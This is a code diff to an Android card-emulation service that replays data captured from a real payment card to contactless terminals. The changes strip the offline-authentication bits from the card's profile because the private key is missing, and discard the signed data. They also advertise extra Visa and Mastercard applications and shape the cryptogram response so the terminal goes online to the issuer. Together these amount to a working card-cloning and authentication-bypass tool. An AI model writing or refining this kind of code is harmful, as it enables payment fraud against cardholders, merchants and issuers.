@@ -17,9 +17,20 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     private static final String TAG = "HCE";
 
-    private static final byte[] SW_OK  = hex("9000");
-    private static final byte[] SW_BAD = hex("6A82");
-    private static final byte[] PPSE   = hex("325041592E5359532E4444463031");
+    private static final byte[] SW_OK          = hex("9000");
+    private static final byte[] SW_BAD         = hex("6A82");
+    private static final byte[] SW_UNSUPPORTED = hex("6D00");
+    private static final byte[] PPSE           = hex("325041592E5359532E4444463031");
+
+    // Fallback AIP when the card has no captured GPO.
+    // byte 1 = 0x18  cardholder verification + terminal risk management, no ODA
+    // byte 2 = 0x80  EMV mode supported
+    private static final String DEFAULT_AIP = "1880";
+
+    // clear SDA (0x40), DDA (0x20), CDA (0x01); keep CV (0x10) and TRM (0x08).
+    // Without the private key none of the three ODA methods can pass, so we
+    // advertise none of them and the terminal skips the step entirely.
+    private static final byte AIP_ODA_MASK = 0x18;
 
     private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
     private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
@@ -27,6 +38,13 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static final String CVMLIST = "000013881F0602071E03";
 
     private final StringBuilder tapLog = new StringBuilder();
+
+    /** The AIP actually sent in the GPO response. The ARQC is MACed over this. */
+    private byte[] txnAip;
+    /** One ATC per tap, shared by the GPO response and the cryptogram. */
+    private String txnAtc;
+    /** True once we have answered a cryptogram request. */
+    private boolean cryptogramSent;
 
     private void tap(String s) {
         tapLog.append(s).append('\n');
@@ -47,7 +65,9 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     static byte[] tlv(int tag, byte[] v) {
         byte[] t;
-        if (tag > 0xFF) {
+        if (tag > 0xFFFF) {
+            t = new byte[]{(byte) (tag >> 16), (byte) (tag >> 8), (byte) tag};
+        } else if (tag > 0xFF) {
             t = new byte[]{(byte) (tag >> 8), (byte) tag};
         } else {
             t = new byte[]{(byte) tag};
@@ -104,21 +124,38 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         try {
             String cur = p("atc", "001B").replaceAll("[^0-9A-Fa-f]", "");
             if (!cur.isEmpty()) atc = Integer.parseInt(cur, 16);
-        } catch (Exception ignored) {}
+        } catch (Exception ignored) { }
         atc = (atc + 1) & 0xFFFF;
         String h = String.format("%04X", atc);
         put("atc", h);
         return h;
     }
 
-    // ---------- captured raw data ----------
+    /** Allocate the transaction ATC exactly once per tap. */
+    private String txnAtc() {
+        if (txnAtc == null) txnAtc = nextAtc();
+        return txnAtc;
+    }
+
+    private void resetTransaction() {
+        txnAip = null;
+        txnAtc = null;
+        cryptogramSent = false;
+    }
+
+    private byte[] aipForMac() {
+        if (txnAip != null) return txnAip;
+        return hex(p("aip", DEFAULT_AIP));
+    }
+
+    // ---------- captured raw data (namespaced per wallet card) ----------
 
     private static byte[] hexOrNull(String s) {
         return (s == null || s.isEmpty()) ? null : hex(s);
     }
 
     private byte[] cap(String key) {
-        return hexOrNull(prefs().getString("cap_" + key, ""));
+        return hexOrNull(p("cap_" + key, ""));
     }
 
     private byte[] rawFci()  { return cap("rawfci"); }
@@ -129,8 +166,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     private static int readTag(byte[] b, int[] pos) {
+        if (pos[0] >= b.length) return 0;
         int t = b[pos[0]++] & 0xFF;
         if ((t & 0x1F) == 0x1F) {
+            if (pos[0] >= b.length) return t;
             t = (t << 8) | (b[pos[0]++] & 0xFF);
             while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                 t = (t << 8) | (b[pos[0]++] & 0xFF);
@@ -140,6 +179,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     private static int readLen(byte[] b, int[] pos) {
+        if (pos[0] >= b.length) return 0;
         int l = b[pos[0]++] & 0xFF;
         if ((l & 0x80) != 0) {
             int n = l & 0x7F, v = 0;
@@ -152,6 +192,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     }
 
     private static String bytesToHex(byte[] d) {
+        if (d == null) return "";
         StringBuilder sb = new StringBuilder();
         for (byte b : d) sb.append(String.format("%02X", b & 0xFF));
         return sb.toString();
@@ -162,6 +203,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
     private static int kernelFor(String aidHex) {
         String a = aidHex == null ? "" : aidHex.toUpperCase();
         if (a.startsWith("A000000152")) return 6;   // Discover / Diners
+        if (a.startsWith("A000000015")) return 6;   // Discover / Diners (legacy RID)
         if (a.startsWith("A000000004")) return 2;   // Mastercard
         if (a.startsWith("A000000065")) return 5;   // JCB
         if (a.startsWith("A000000025")) return 4;   // Amex
@@ -169,29 +211,35 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return 3;                                   // Visa and anything else
     }
 
-    private byte[] appEntry(String aidHex, String label) {
+    /**
+     * priority 1 = the card the terminal should actually use.
+     * Anything higher is a fallback it should only reach for if the real
+     * application fails. Equal priorities let the terminal wander off to Visa
+     * and then apply the wrong kernel to foreign data.
+     */
+    private byte[] appEntry(String aidHex, String label, int priority) {
         return cat(
                 tlv(0x4F, hex(aidHex)),
                 tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
-                tlv(0x87, new byte[]{0x01}),
+                tlv(0x87, new byte[]{(byte) priority}),
                 tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
     }
 
     private byte[] buildPpse() {
-        String realAid = prefs().getString("cap_aid", "");
-        if (realAid == null || realAid.isEmpty()) realAid = p("aid", "A0000000031010");
+        String realAid = p("cap_aid", "");
+        if (realAid.isEmpty()) realAid = p("aid", "A0000000031010");
 
         ByteArrayOutputStream dir = new ByteArrayOutputStream();
 
-        byte[] e0 = tlv(0x61, appEntry(realAid, "CARD"));
+        byte[] e0 = tlv(0x61, appEntry(realAid, "CARD", 1));
         dir.write(e0, 0, e0.length);
 
         if (!realAid.equalsIgnoreCase("A0000000031010")) {
-            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA"));
+            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA", 2));
             dir.write(e, 0, e.length);
         }
         if (!realAid.equalsIgnoreCase("A0000000041010")) {
-            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD"));
+            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD", 3));
             dir.write(e, 0, e.length);
         }
 
@@ -200,7 +248,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return tlv(0x6F, inner);
     }
 
-    // make the captured FCI claim the AID the terminal actually asked for
+    /** Make the captured FCI claim the AID the terminal actually asked for. */
     private byte[] patchFci(byte[] fci, byte[] aid) {
         int[] pos = new int[1];
         int outer = readTag(fci, pos);
@@ -238,19 +286,24 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             int p1  = apdu[2] & 0xFF;
             int p2  = apdu[3] & 0xFF;
 
-            if (ins == 0xA4 && p1 == 0x04 && apdu.length >= 5) {
+            boolean isSelect = (ins == 0xA4 && (p1 == 0x04 || p1 == 0x00));
+
+            if (isSelect && apdu.length >= 5) {
                 int lc0 = apdu[4] & 0xFF;
                 if (apdu.length >= 5 + lc0) {
                     byte[] nm = new byte[lc0];
                     System.arraycopy(apdu, 5, nm, 0, lc0);
-                    if (Arrays.equals(nm, PPSE)) tapLog.setLength(0);
+                    if (Arrays.equals(nm, PPSE)) {
+                        tapLog.setLength(0);
+                        resetTransaction();
+                    }
                 }
             }
 
             tap(">> " + bytesToHex(apdu));
 
             byte[] out;
-            if (ins == 0xA4 && p1 == 0x04) {
+            if (isSelect) {
                 if (apdu.length < 5) return SW_BAD;
                 out = select(apdu);
             } else if (ins == 0xA8) {
@@ -261,6 +314,8 @@ public class HceCcEmulationServiceVisa extends HostApduService {
                 out = genac(apdu);
             } else if (ins == 0xCA) {
                 out = getData(apdu);
+            } else if (ins == 0x88) {
+                out = SW_UNSUPPORTED;
             } else {
                 out = SW_BAD;
             }
@@ -279,19 +334,20 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         byte[] name = new byte[lc];
         System.arraycopy(apdu, 5, name, 0, lc);
 
-        String label = p("label", "CARD");
-
-        // the directory - our real AID plus Visa and Mastercard so any terminal bites
         if (Arrays.equals(name, PPSE)) {
             return cat(buildPpse(), SW_OK);
         }
 
-        // any AID the terminal picks - answer with the card's real FCI, restamped
+        String real = p("aid", "");
+        tap("-- selected " + bytesToHex(name)
+                + " | card is " + (real.isEmpty() ? "?" : real));
+
         byte[] captured = rawFci();
         if (captured != null) {
             return cat(patchFci(captured, name), SW_OK);
         }
 
+        String label = p("label", "CARD");
         byte[] prop = cat(
                 tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
                 tlv(0x87, new byte[]{0x01}),
@@ -306,19 +362,23 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             return cat(rewriteGpo(captured), SW_OK);
         }
 
-        String aip = p("aip", "3800");
+        byte[] aip = hex(p("aip", DEFAULT_AIP));
         String afl = p("afl", "08010100");
+        txnAip = aip;
+
         if (isMsd()) {
-            return cat(tlv(0x80, cat(hex(aip), hex(afl))), SW_OK);
+            return cat(tlv(0x80, cat(aip, hex(afl))), SW_OK);
         }
-        return cat(tlv(0x77, cat(tlv(0x82, hex(aip)), tlv(0x94, hex(afl)))), SW_OK);
+        return cat(tlv(0x77, cat(tlv(0x82, aip), tlv(0x94, hex(afl)))), SW_OK);
     }
 
     private byte[] rewriteGpo(byte[] raw) {
         int[] pos = new int[1];
         int outer = readTag(raw, pos);
 
+        // magstripe mode: AIP is the first two bytes of the value, no tags to walk
         if (outer == 0x80) {
+            if (raw.length >= 4) txnAip = new byte[]{raw[2], raw[3]};
             return raw.clone();
         }
 
@@ -336,13 +396,14 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             i = q[0] + l;
 
             if (t == 0x9F4B) {
-                continue;
+                continue;                                  // SDAD, we cannot recompute it
             } else if (t == 0x82 && v.length >= 2) {
-                v = new byte[]{(byte) (v[0] & 0xFE), v[1]};
+                v = new byte[]{(byte) (v[0] & AIP_ODA_MASK), v[1]};
+                txnAip = v;
             } else if (t == 0x9F27) {
                 v = new byte[]{0x40};
             } else if (t == 0x9F36) {
-                v = hex(nextAtc());
+                v = hex(txnAtc());
             } else if (t == 0x9F26) {
                 v = new byte[8];
             } else if (t == 0x9F6C && v.length >= 2) {
@@ -379,20 +440,25 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
         if (pan.length() % 2 != 0) pan = pan + "F";
 
-        byte[] panT   = tlv(0x5A, hex(pan));
-        byte[] expT   = tlv(0x5F24, hex(exp + "00"));
-        byte[] trackT = tlv(0x57, hex(track));
-        byte[] cdol1T = tlv(0x8C, hex(CDOL1));
-        byte[] cdol2T = tlv(0x8D, hex(CDOL2));
-        byte[] cvmT   = tlv(0x8E, hex(CVMLIST));
-
-        return cat(tlv(0x70, cat(panT, expT, trackT, cdol1T, cdol2T, cvmT)), SW_OK);
+        return cat(tlv(0x70, cat(
+                tlv(0x5A, hex(pan)),
+                tlv(0x5F24, hex(exp + "00")),
+                tlv(0x57, hex(track)),
+                tlv(0x8C, hex(CDOL1)),
+                tlv(0x8D, hex(CDOL2)),
+                tlv(0x8E, hex(CVMLIST)))), SW_OK);
     }
 
     private byte[] genac(byte[] apdu) {
         int p1 = apdu[2] & 0xFF;
+        int requested = p1 & 0xC0;
 
-        String atc = ((p1 & 0xC0) == 0x80) ? nextAtc() : p("atc", "001B");
+        // mirror what the terminal asked for, otherwise it never goes online
+        int cid = (requested == 0x80) ? 0x00      // ARQC
+                : (requested == 0x40) ? 0x40      // TC
+                : 0x80;                           // AAC
+
+        String atc = txnAtc();
 
         byte[] cdol = new byte[0];
         if (apdu.length >= 5) {
@@ -402,24 +468,36 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             }
         }
 
-        int cid = 0x40;
-
         byte[] ac = computeAc(atc, cdol);
+        cryptogramSent = true;
 
-        byte[] cidT  = tlv(0x9F27, new byte[]{(byte) cid});
-        byte[] atcT  = tlv(0x9F36, hex(atc));
-        byte[] arqcT = tlv(0x9F26, ac);
-        byte[] iadT  = tlv(0x9F10, hex(p("iad", "06010A03A0B800")));
-        return cat(tlv(0x77, cat(cidT, atcT, arqcT, iadT)), SW_OK);
+        tap("-- genac requested=" + String.format("%02X", requested)
+                + " cid=" + String.format("%02X", cid)
+                + " atc=" + atc + " arqc=" + bytesToHex(ac));
+
+        return cat(tlv(0x77, cat(
+                tlv(0x9F27, new byte[]{(byte) cid}),
+                tlv(0x9F36, hex(atc)),
+                tlv(0x9F26, ac),
+                tlv(0x9F10, hex(p("iad", "06010A03A0B800"))))), SW_OK);
     }
 
+    /**
+     * MAC input is CDOL data, then AIP, then ATC. If the issuer declines with a
+     * MAC error, this ordering is the first thing to flip.
+     */
     private byte[] computeAc(String atc, byte[] cdol) {
         String mk = p("mkac", "").replaceAll("[^0-9A-Fa-f]", "");
-        if (mk.length() < 32) return new byte[8];
+        if (mk.length() < 32) {
+            tap("!! no MK-AC set - ARQC will be all zeros");
+            return new byte[8];
+        }
         try {
-            byte[] macIn = cat(hex(p("aip", "3800")), hex(atc), cdol);
-            return EmvCrypto.arqc(mk, p("pan", "4111111111111111"), "00", atc, macIn);
+            byte[] macIn = cat(cdol, aipForMac(), hex(atc));
+            return EmvCrypto.arqc(mk, p("pan", "4111111111111111"),
+                    p("psn", "00"), atc, macIn);
         } catch (Exception e) {
+            tap("!! ARQC failed: " + e);
             return new byte[8];
         }
     }
@@ -464,7 +542,7 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         if (gpos == 0)    return "TAP: terminal picked an app then stopped - it rejected the FCI";
         if (recs == 0)    return "TAP: terminal started a transaction but read no records - it didn't like the AFL";
         if (gens == 0)    return "TAP: terminal read " + recs + " records then quit before the cryptogram - its own ODA or CVM check failed";
-        if (gens >= 2)    return "TAP: terminal WENT ONLINE - the issuer judged our fake ARQC";
+        if (gens >= 2)    return "TAP: terminal WENT ONLINE - the issuer judged our ARQC";
         if (l.contains("9F270140")) return "TAP: terminal got our TC (approved offline) and stopped anyway - its decision";
         return "TAP: terminal asked for a cryptogram and we did not answer TC";
     }
